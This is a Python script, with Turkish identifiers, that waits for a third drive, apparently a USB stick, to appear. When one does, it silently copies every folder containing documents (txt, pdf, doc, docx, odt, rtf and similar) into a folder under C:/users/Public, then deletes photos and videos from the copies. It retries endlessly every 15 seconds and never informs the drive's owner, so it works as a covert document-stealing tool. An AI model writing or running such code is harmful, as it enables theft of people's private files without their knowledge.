import os,shutil
import random
import time

ortak = "ortak"
txtler = "txtler"
pdfler = "pdfler"
odtler = "odtler"
doclar = "doclar"
docxlar = "docxlar"
ottler = "ottler"
rtfler = "rtfler"
uotlar = "uotlar"
dicler = "dicler"

def trytoreach():
 try:
    dl = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    drives = ['%s:' % d for d in dl if os.path.exists('%s:' % d)]
    path = f"{str(drives[2])}/"

    def get_extension(start_path=path):
        for dirpath, dirnames, filenames in os.walk(start_path):
            for f in filenames:
                root, extension = os.path.splitext(f)
                print(extension)

                if extension == ".txt":
                    try:
                        randomklasor = random.randrange(1, 10000)
                        shutil.copytree(dirpath, f"C:/users/Public/{ortak}/{txtler}/{randomklasor}")
                    except:
                        print("hata :D")
                elif extension == ".pdf":
                    try:
                        randomklasor = random.randrange(1, 10000)
                        shutil.copytree(dirpath, f"C:/users/Public/{ortak}/{pdfler}/{randomklasor}")
                    except:
                        print("hata :D")
                elif extension == ".odt":
                    try:
                        randomklasor = random.randrange(1, 10000)
                        shutil.copytree(dirpath, f"C:/users/Public/{ortak}/{odtler}/{randomklasor}")
                    except:
                        print("hata :D")
                elif extension == ".doc":
                    try:
                        randomklasor = random.randrange(1, 10000)
                        shutil.copytree(dirpath, f"C:/users/Public/{ortak}/{doclar}/{randomklasor}")
                    except:
                        print("hata :D")
                elif extension == ".docx":
                    try:
                        randomklasor = random.randrange(1, 10000)
                        shutil.copytree(dirpath, f"C:/users/Public/{ortak}/{docxlar}/{randomklasor}")
                    except:
                        print("hata :D")
                elif extension == ".ott":
                    try:
                        randomklasor = random.randrange(1, 10000)
                        shutil.copytree(dirpath, f"C:/users/Public/{ortak}/{ottler}/{randomklasor}")
                    except:
                        print("hata :D")
                elif extension == ".rtf":
                    try:
                        randomklasor = random.randrange(1, 10000)
                        shutil.copytree(dirpath, f"C:/users/Public/{ortak}/{rtfler}/{randomklasor}")
                    except:
                        print("hata :D")
                elif extension == ".uot":
                    try:
                        randomklasor = random.randrange(1, 10000)
                        shutil.copytree(dirpath, f"C:/users/Public/{ortak}/{uotlar}/{randomklasor}")
                    except:
                        print("hata :D")
                elif extension == ".dicler":
                    try:
                        randomklasor = random.randrange(1, 10000)
                        shutil.copytree(dirpath, f"C:/users/Public/{ortak}/{dicler}/{randomklasor}")
                    except:
                        print("hata :D")
    def deletephotos(start_path=f"C:/users/Public/{ortak}"):
        for dirpath, dirnames, filenames in os.walk(start_path):
            for f in filenames:
                root, extension = os.path.splitext(f)
                print(extension)
                if extension == ".jpeg":
                    try:
                        os.remove(dirpath + f"\{f}")
                    except:
                        print("hata")
                elif extension == ".mp4":
                    try:
                        os.remove(dirpath + f"\{f}")
                    except:
                        print("hata")
                elif extension == ".png":
                    try:
                        os.remove(dirpath + f"\{f}")
                    except:
                        print("hata")
                elif extension == ".jpg":
                    try:
                        os.remove(dirpath + f"\{f}")
                    except:
                        print("hata")
                elif extension == ".bmp":
                    try:
                        os.remove(dirpath + f"\{f}")
                    except:
                        print("hata")

    get_extension()
    deletephotos()
 except:
     print("hata")
     time.sleep(15)
     trytoreach()

trytoreach()









